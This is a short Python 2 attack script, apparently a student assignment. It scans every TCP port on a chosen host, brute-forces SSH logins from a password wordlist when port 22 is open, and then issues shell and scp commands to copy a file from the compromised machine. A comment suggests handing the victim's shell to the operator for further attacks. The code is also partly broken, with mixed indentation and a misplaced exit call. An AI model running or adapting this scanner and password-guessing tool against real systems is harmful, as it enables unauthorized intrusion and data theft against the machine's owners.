import socket
import random
from threading import Thread
from errno import ECONNREFUSED
from pexpect import pxssh
import getpass
from functools import partial
import sys


# This function send a socket to a specific port, and try to connect.
# If the connection is a success, then begin the passwordGuessing function, because that's mean that the port is open, else do nothing. 
def sendSocket(port):
    try:
        socket.socket().connect((hostName, port))
        if (port == 22):
	    print('Success, the port 22 is open')
	    passwordGuessing()
    except socket.error as err:
        if err.errno == ECONNREFUSED:
            return False
        raise

# This method define a thread which call the function sendSocket with all the possible numbers of ports (from 1 to 65536).
def portScanning():
    listOfPorts = list(range(1, 65536))
    random.shuffle(listOfPorts)
    count = 0
    while(count < 65534):
        thread = Thread(target=sendSocket, args=(listOfPorts[count],))
        count += 1
        thread.start()
     
# This method read a file txt which include a lot of possibilities of passwords, and send them to the function connect.
def passwordGuessing():
    text_file = open("/home/samuel/Desktop/University/Tikchoret/Assignment5/Python codes/txt files for PasswordGuessing and stealthy ftp/passwordsTest.txt", "r")
    lines = text_file.readlines(); 
    count = 0;
    while(count < len(lines)):
	FTP(lines[count])
        count += 1

# The path of the file we want to capture in the computer of the target.
# Here, we assume that the file is in the Desktop, but he could be in other place, then, if the path of the file is unknow
# We can use ls which return a list of all the directory of the target computer.
# To go deeper here his a idea of use of the FTP function :
# Since the shell of the target is open, we can let the user do his own input of the target's shell, and from here the attack his define by the user and not predefine by the coder.
def FTP(password):
    try:
	hostPath = 'cd Desktop' # We can use a detector of file
	fileName = 'test.txt'
	path = '/home/samuel/'
	commandLine = 'scp ' + fileName + ' ' + userName + '@' + hostName + ':' + path
        s = pxssh.pxssh()
        s.login(hostName, userName, password)
	print('Success, the password have been cracked')
        s.sendline(hostPath) 
        s.prompt()  
        s.sendline(commandLine) 
        s.prompt()
        s.sendline(password) 
	print('FINISH')
	sys.exit(0)
        s.prompt()  
    except pxssh.ExceptionPxssh as e:
        print('Not the good password')

# The ip adress of the target.
hostName = raw_input("Please input the host name :")
# The user name of the target.
userName = raw_input("Please input the user name :")

portScanning()



